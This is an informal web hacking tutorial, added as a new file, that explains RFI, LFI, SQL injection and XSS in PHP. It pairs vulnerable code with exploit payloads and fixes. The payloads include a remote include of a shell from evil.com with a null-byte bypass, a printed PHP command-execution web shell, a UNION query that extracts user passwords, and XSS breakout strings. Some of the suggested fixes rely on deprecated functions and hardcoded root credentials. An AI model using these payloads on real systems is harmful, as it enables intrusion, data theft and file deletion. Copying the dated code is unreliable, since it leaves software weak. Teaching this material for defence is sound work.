@@ -1,0 +1,412 @@
+--= WebHacking
+
+-= Intro
+
+in this tutorial, we will discuss the vulnerabilities, and what goes wrong with the developer, and some ways to exploit them...
+
+Enjoy!!
+
+Tutorial: [ Basic || 1 ]
+
++------------------------------------------+
+|
+| || Starter ||
+|
++------------------------------------------+
+
+Things to know:
+
+=- Vulnerability : a security hole, can be exploited to change the way the webapp / software works / functions.
+
+=- CMS's, Forums uses DataBases to store the info like users, posts, threads, messages and so on, its usually / mostly a MySQL server.
+
+=- RFI [ Remote File Inclusion ] : a malicious user can include a 'bad' code to be executed on the vulnerable site.
+
+=- LFI [ Local File Inclusion ] : a malicious user can open any file on the server.
+
+=- SQL Injection : Injecting a MySQL query to bypass or get more info from a DataBase.
+
+=- XSS [ Cross Site Scripting ] : if it was a permanent vulnerability, where the users input is saved, the user can log cookies, IP, and much more...
+
+=- Exploit : a script made to maliciously use a vulnerability.
+
+
++------------------------------------------+
+|
+| || What goes wrong ||
+|
++------------------------------------------+
+
+We are going to take each vulnerability, and take alook at what goes wrong with the web developer, that made the script vulnerable...
+
+=- RFI ::
+
+RFI's are exploited by including a 'bad' code from another site, to the infected site, for example you can include a PHP-Shell, and execute command on the server using it...
+
+this vulnerability is very dangerous, a site infected with it can be compromised easily...
+
+an example of a code infected with a RFI:
+
+ 
+<?php 
+ 
+$page = $_GET['page']; 
+ 
+if (isset($page)) 
+{ 
+include($page); 
+} 
+ 
+?> 
+
+
+
+
+as you can see, we are taking the variable page, and including it, now that script will work great and do what it's supposed to do, for example:
+
+www.example.com/index.dmz?page=contact.dmz
+
+this would open contact.dmz, BUT, what would a malicious user do?
+
+www.example.com/index.dmz?page=http://www.evil.com/shell.txt?
+
+the shell code must be in a txt file, because this way the code will be parsed / executed on the vulnerable site.
+
+what happens then?
+
+ 
+<?php 
+ 
+$page = $_GET['page']; 
+ 
+if (isset($page)) 
+{ 
+include('http://www.evil.com/shell.txt?'); 
+} 
+ 
+?> 
+
+
+
+
+that text file gets included, so lets say the shell.txt had the following code:
+
+ 
+<?php 
+ 
+$command = $_GET['cmd']; 
+ 
+if ($command) 
+{ 
+@system($command); 
+} 
+echo " 
+<form method='GET'> 
+<input type='text' name='cmd'> 
+<input type='submit' name='submit' value='Go!'> 
+</form>"; 
+ 
+?> 
+
+
+
+
+a small text box would appear on the page, with a button, that would execute commands... the user can compromise the full site using this simple text box, if he had enough privs, he can do the following:
+
+rm -rf
+
+and delete your files...
+
+some devs, think they can fix the vulnerability by doing the following:
+
+ 
+<?php 
+ 
+$page = $_GET['page']; 
+$page = $page . ".php"; 
+ 
+if (isset($page)) 
+{ 
+include($page); 
+} 
+ 
+?> 
+
+
+
+
+this way, you can only include .php files, and that is not really a big deal cause PHP gets parsed on the server side...
+
+but, that wont stop some people, there is something called a NullByte, that would simply tell PHP to ignore anything after it... if someone wanted to exploit that code, he would do:
+
+www.darkmindz.com/index.dmz?page=http://www.evil.com/shell.txt?%00
+
+as you can see, the [ %00 ] is the NullByte, that would get parsed this way:
+
+
+
+ 
+<?php 
+ 
+$page = $_GET['page']; 
+$page = $page . ".php"; 
+ 
+if (isset($page)) 
+{ 
+include('http://www.evil.com/shell.txt?'); // ignoring anything after the Nu 
+llByte, which is in this case, the .php... 
+} 
+ 
+?> 
+
+
+
+
+
+so the question now, is how to completely secure this URL system?!
+
+well, you can use a switch statement, and this way, anything other than what is already stated, wont be included.. ex:
+
+ 
+<?php 
+ 
+if(isset($_REQUEST['page'])) 
+{ 
+switch ($_REQUEST['page']) { 
+ 
+case 'about': 
+include('about.php'); // if the page was about, get the about.php contents... 
+break; 
+ 
+case 'contact': 
+include('contact.php'); // and so on :) 
+break; 
+ 
+default: 
+include('index.php'); // the default page to include, if the page variable was n 
+ot found, or it was a hack attempt :) 
+break; 
+ 
+} 
+ 
+} 
+ 
+ 
+?> 
+
+
+
+
+that is a perfect system, simple, secure, and works :)
+
+now that is done, RFI, is just like LFI, nothing is different, but the fact that LFI only gets the pages from the server, most of the times download scripts are infected with LFI, cause they are made to readfile(); whatever it was lol.. which is just bad coding...
+
+
+
+Now moving to SQL injections, those are deadly when E-Commerce sites are infected with them!!
+
+a malicious user would exploit an infected code, by bypassing a login form, and logging in as admin.
+
+or by injecting the URL so he can execute MySQL query's, which would let him gain access to Users info, and so on ...
+
+example of vulnerable code:
+
+ 
+<?php 
+ 
+$host = "localhost"; 
+$user = "root"; 
+$pass = "r00t"; 
+$db = "banks"; 
+ 
+mysql_connect($host, $user, $pass); 
+mysql_select_db($db); 
+ 
+$id = $_GET['id']; 
+ 
+if (isset($id)) 
+{ 
+$query = mysql_query("SELECT * FROM `news` WHERE `id` = $id"); 
+if ($query) 
+{ 
+while($news = mysql_fetch_array($query)) 
+{ 
+echo $news['news']; 
+} 
+} 
+} 
+ 
+?> 
+
+
+
+
+now, as you can see, it takes the 'id' variable, and query's it, with no filters at all!!!
+
+now if i wanted to inject it, i would first check for the vulnerability.... by doing the following:
+
+www.example.com/page.php?id=1 OR 2
+
+IF 2 news was there, then am lucky :D, and here comes the good part, where the information gets extracted, using a UNION command, i can select from another column, and echo it there...
+
+so an injection would be:
+
+www.example.com/page.php?id=1 OR 2 UNION SELECT name,1,password,email FROM users
+
+this would echo the passwords, to the page. now depending on the number of rows in the news column, i will need to change the number of rows selected...
+
+so now we know what went wrong, lets secure it!!
+
+ 
+<?php 
+ 
+$host = "localhost"; 
+$user = "root"; 
+$pass = "r00t"; 
+$db = "banks"; 
+ 
+@mysql_connect($host, $user, $pass); // adding the @ sign will make it error fre 
+e, no errors is shown if the DB couldnt be selected or connection refused 
+@mysql_select_db($db); 
+ 
+$id = (Int) $_GET['id']; // now we are telling PHP that id is an Integer 
+, do not process anything else.. ;) 
+ 
+ 
+if (isset($id)) 
+{ 
+$query = mysql_query("SELECT * FROM `news` WHERE `id` = $id"); 
+if ($query) 
+{ 
+while($news = mysql_fetch_array($query)) 
+{ 
+echo $news['news']; 
+} 
+} 
+} 
+?> 
+
+
+
+
+that is it, this code is secure...
+
+now moving to XSS, it is not really a big issue UNLESS it was permanent!
+
+example of permanent XSS would be in a guestbook, comments, contact forms, mailing lists, etc...
+
+what can the malicious user do?
+
+well, he can use a javascript to change title, forms, prices, hidden data, pages, actions, and even worse, log the page!
+some CMS's and Forums, uses cookies and store the users info in them, if that site was vulnerable to XSS, the attacker can gain admin privs by logging the admin cookies...
+
+a vulnerable code would be:
+
+ 
+<?php 
+ 
+$message = $_POST['message']; 
+ 
+if (isset($_POST['message'])) 
+{ 
+ 
+echo "Thank you, your message has been posted!"; 
+ 
+echo "<br />"; 
+ 
+echo $message; 
+} 
+ 
+echo " 
+<form method='post' name='message_box'> 
+<input type='text' name='message'> 
+<input type='submit' name='submit'> 
+</form>"; 
+ 
+?> 
+
+
+
+
+ok, so now a malicious user could do the following:
+
+submit the following text to test for vulnerability :
+
+<script>alert("xss")</script>
+
+
+
+
+or
+
+<h1>Nice Website!</h1>
+
+
+
+
+IF the HTML gets parsed "and it will in this code" , the attacker will now move to the next step, which is logging the page.. by redirecting it to a logger..
+
+some methods of bypassing some filters, for example, if the form only submits links, lets take this one as an example:
+
+
+ 
+<?php 
+ 
+$message = $_POST['message']; 
+ 
+if (isset($_POST['message'])) 
+{ 
+ 
+echo "Thank you, your link has been added!"; 
+ 
+echo "<br />"; 
+ 
+echo "<a href='$message'>Link</a>";; 
+} 
+ 
+echo " 
+<form method='post' name='message_box'> 
+<input type='text' name='message'> 
+<input type='submit' name='submit'> 
+</form>"; 
+ 
+?> 
+
+
+
+
+now that should not parse anything, but simply wrap it in a link right?
+
+well, i don't think so, you can simply bypass it using:
+
+ '> <script>alert("owned")</script> 
+
+
+
+
+why does that bypass it?!
+
+here is what happens, the
+
+ '> 
+
+
+will stop the a tag, and then you can open anything else...
+
+here is the result:
+
+ <a href=''> <script>alert("owned")</script>'>Link</a> 
+
+
+
+
+as you can see, the a tag got closed, which allowed me to open another tag, which is a script here. and it works :)
+
+
++------------------------------------------+
+|
+| || The End ||
+|
++------------------------------------------+
+
+Well, we are done now :), i hope you enjoyed this tutorial, and learned something new from it...
